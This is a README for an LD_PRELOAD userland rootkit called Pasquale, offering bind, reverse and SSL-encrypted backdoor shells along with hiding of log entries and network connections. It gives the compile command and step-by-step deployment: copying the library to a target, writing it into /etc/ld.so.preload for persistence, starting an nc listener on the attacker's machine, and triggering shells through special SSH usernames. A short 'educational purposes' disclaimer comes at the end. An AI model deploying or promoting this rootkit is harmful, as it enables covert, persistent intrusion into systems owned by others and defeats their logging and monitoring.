# Pasquale Rootkit

## Overview

Pasquale is a userland rootkit utilizing the `LD_PRELOAD` technique to hook system calls and provide various backdoor functionalities. It demonstrates advanced concepts in C programming and security.

## Features

- **Backdoor Access**: Provides bind shell, reverse shell, and SSL-encrypted shell backdoors.
- **Log Manipulation**: Hides specific log entries from `vsftpd.log` and syslog.
- **Process Hiding**: Conceals specific connections from `netstat` and `lsof`.

## Installation

### Prerequisites

Ensure you have OpenSSL installed on your system. On macOS, use Homebrew:

```bash
brew install openssl
```

### Compilation

Compile the rootkit as a shared library:

```bash
gcc pasquale.c -fPIC -shared -D_GNU_SOURCE -o lib.pack.so.6 -ldl -lssl -lcrypto
```

### Deployment

1. **Upload the Library**: Transfer the compiled library to the target system.

    ```bash
    scp lib.pack.so.6 user@target:/tmp/
    ```

2. **Move the Library**: Move the library to a suitable location.

    ```bash
    mv /tmp/lib.pack.so.6 /lib/i386-linux-gnu/lib.pack.so.6
    ```

3. **Configure `LD_PRELOAD`**: Add the library to `/etc/ld.so.preload`.

    ```bash
    echo "/lib/i386-linux-gnu/lib.pack.so.6" > /etc/ld.so.preload
    ```

### Verification

Verify that the library is loaded:

```bash
ldd /bin/ls
```

Check that `lib.pack.so.6` is listed.

## Usage

### Starting a Listener

Start a listener on the attacker's machine:

```bash
nc -lvp 443
```

### Triggering the Backdoor

Use one of the special usernames to trigger the desired backdoor (bind, reverse, or SSL):

```bash
ssh BIND_USER@target
ssh REVERSE_USER@target
ssh OPENSSL_USER@target
```

## Important Notes

- **Educational Purposes**: This rootkit is intended for educational purposes only. Do not use it for malicious activities.
- **System Impact**: Running this rootkit can have significant security implications. Use it in a controlled and legal environment.

## License

This project is licensed under the MIT License.

---
